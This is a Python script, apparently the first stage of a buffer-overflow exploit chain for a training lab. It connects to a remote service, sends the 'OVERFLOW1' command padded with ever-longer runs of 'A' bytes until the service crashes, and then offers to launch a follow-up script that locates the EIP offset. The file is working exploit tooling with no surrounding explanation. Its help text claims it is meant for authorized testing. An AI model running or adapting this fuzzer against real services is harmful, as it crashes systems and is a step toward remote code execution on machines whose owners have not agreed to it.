#!/usr/bin/env python3

import socket
import argparse
import itertools
import time
import subprocess
import sys
from typing import Optional

def main(ip: str, port: int, increment: Optional[int] = None) -> None:
	# Define prefix and buffer
	prefix = b"OVERFLOW1 "														# CHANGE IF NECESSARY
	buffer = b"A"
	timeout = 5
	payload = b""
	try:
		# Create socket object
		with socket.socket() as s:
			# Connect to target server
			s.connect((ip, port))

			# Set Timeout
			s.settimeout(timeout)

			# Print server banner
			response = s.recv(4096)
			print(f"Banner: {response.decode()}")

			# Send data to the server with increasing buffer sizes
			step = increment or 100
			for size in itertools.count(step, step):
				payload = b"".join(
					[
						prefix,
						buffer * size
					]
				)
				print(f"Fuzzing with {len(payload) - len(prefix)} bytes...")
				s.send(payload)

				response = s.recv(4096)
				# Print the response from the server
				print(f"Response: {response.decode()}")

		
	except Exception as e:
		print(e)
		print("\n","="*25,"CRASH","="*25,"\n")
		overflow_threshold = len(payload) - len(prefix)
		print(f"Application crashed at {overflow_threshold} bytes!")
		while True:
			answer = input("Do you want to continue and find the EIP offset? (y/n): ")
			if answer.lower() == "y":
				print("Starting to find EIP script with:")
				print(f"\tIP: {ip}")
				print(f"\tPort: {port}")
				print(f"\tOverflow Threshold: {overflow_threshold}")
				subprocess.run(['python', './002_control_eip.py', ip, port, overflow_threshold])
				break
			elif answer.lower() == "n":
				print("Exiting...")
				break
			else:
				print("Invalid input, please enter 'y' or 'n'.")
		sys.exit(0)

if __name__ == "__main__":
	# Parse command line arguments
	parser = argparse.ArgumentParser(
		prog="Crash Fuzzer",
		description="""This is a Python script for fuzz testing a remote server by sending various buffer sizes to the target application. 
	The script takes three arguments: an IP address, a port number, and an optional increment flag. It runs the target program multiple times, each time with a different buffer size, 
	in an attempt to crash the target program. The IP address and port number must be provided when running the script, and the increment flag can be optionally specified to set the 
	step size for the buffer size increases. By default, the increment value is set to 100. The purpose of this script is to test the robustness of the target program by simulating 
	various attack scenarios. It is intended for use in a controlled testing environment and should not be used to target production systems or networks without proper authorization.""",
		epilog="Have fun experimenting with this tool!"
	)
	parser.add_argument("ip", help="IP address of the target")
	parser.add_argument("port", type=int, help="Port number of the target")
	parser.add_argument("-i", "--increment", type=int, help="Increment value to be used, default is 100")
	args = parser.parse_args()

	# Call main function
	main(args.ip, args.port, args.increment)